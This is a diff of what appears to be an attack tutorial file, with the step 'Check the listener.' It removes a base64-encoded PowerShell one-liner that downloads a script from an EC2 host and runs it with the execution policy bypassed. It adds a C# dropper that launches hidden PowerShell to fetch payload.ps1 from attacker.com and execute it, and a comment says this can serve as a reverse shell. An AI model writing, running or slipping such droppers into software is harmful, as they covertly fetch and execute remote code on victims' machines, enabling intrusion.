@@ -46,4 +46,23 @@ echo "Invoke-WebRequest -Uri 'http://ec2-3-253-172-6.eu-west-1.compute.amazonaws
 5. Check the listener.
 
 
-SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcAA6AC8ALwBlAGMAMgAtADMALQAyADUAMwAtADIANAA1AC0AMQAyADAALgBlAHUALQB3AGUAcwB0AC0AMQAuAGMAbwBtAHAAdQB0AGUALgBhAG0AYQB6AG8AbgBhAHcAcwAuAGMAbwBtADoAOAAwAC8AcABlAHIAZgBlAGMAdAAuAHAAcwAxACcAIAAtAE8AdQB0AEYAaQBsAGUAIAAnAHAAZQByAGYAZQBjAHQALgBwAHMAMQAnADsAIABwAG8AdwBlAHIAcwBoAGUAbABsACAALQBFAHgAZQBjAHUAdABpAG8AbgBQAG8AbABpAGMAeQAgAEIAeQBwAGEAcwBzACAALQBGAGkAbABlACAAJwBwAGUAcgBmAGUAYwB0AC4AcABzADEAJwAKAA
+```
+
+using System.Diagnostics;
+
+static class Program {
+    [System.STAThread] // (Use STA if a GUI/WinForms app; not needed for pure console)
+    static void Main() {
+        // Prepare PowerShell command (e.g., reverse shell or arbitrary script)
+        string psArgs = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass "
+                      + "-Command \"Invoke-WebRequest -Uri 'http://attacker.com/payload.ps1' -OutFile 'payload.ps1'; "
+                      + "powershell -ExecutionPolicy Bypass -File 'payload.ps1'\"";
+        // Configure process start info to launch PowerShell
+        ProcessStartInfo psi = new ProcessStartInfo("powershell.exe", psArgs) {
+            CreateNoWindow = true,   // no new window for PowerShell
+            UseShellExecute = false  // required for CreateNoWindow
+        };
+        Process.Start(psi);
+    }
+}
+```
